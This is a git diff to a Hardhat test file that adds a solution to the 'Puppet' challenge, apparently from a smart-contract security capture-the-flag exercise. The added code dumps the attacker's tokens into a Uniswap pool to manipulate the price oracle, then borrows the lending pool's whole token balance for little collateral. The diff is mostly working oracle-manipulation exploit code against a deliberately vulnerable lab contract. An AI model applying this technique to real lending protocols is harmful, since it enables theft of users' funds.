@@ -102,7 +102,52 @@ describe('[Challenge] Puppet', function () {
     });
 
     it('Exploit', async function () {
+        const printPrices = async () => {
+            const ethPriceInToken = await this.uniswapExchange.getEthToTokenInputPrice(
+                ethers.utils.parseEther('1'),
+                { gasLimit: 1e6 }
+            );
+            console.log(`ethPriceInToken : ${ethPriceInToken}`);
+
+            const tokenPriceInETth = await this.uniswapExchange.getTokenToEthInputPrice(
+                ethers.utils.parseEther('1'),
+                { gasLimit: 1e6 }
+            );
+            console.log(`tokenPriceInETth : ${tokenPriceInETth}`);
+
+            const balance = await ethers.provider.getBalance(this.uniswapExchange.address);
+            console.log(`eth balance : ${balance}`);
+
+            const deposit = await this.lendingPool.calculateDepositRequired(100000);
+            console.log(`deposit required: ${deposit}`);
+        };
+
         /** CODE YOUR EXPLOIT HERE */
+
+
+        await printPrices();
+
+        // approve all tokens from attacker to exchnage
+        await this.token.connect(attacker).approve(
+            this.uniswapExchange.address,
+            ATTACKER_INITIAL_TOKEN_BALANCE
+        );
+
+        //buy up all the ETH with attackers available DVT token, this will break the 1:1 peg and will
+        // drive down the needed collateral drastically
+        const tx = await this.uniswapExchange.connect(attacker).tokenToEthSwapOutput(
+            ethers.utils.parseEther('9.9'),
+            ATTACKER_INITIAL_TOKEN_BALANCE,
+            (await ethers.provider.getBlock('latest')).timestamp * 2,
+            { gasLimit: 1e6 }
+        );
+        const { events } = await tx.wait();
+
+        await printPrices();
+
+        // borrow the max token count
+        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE, {value: ethers.utils.parseEther('25')})
+
     });
 
     after(async function () {
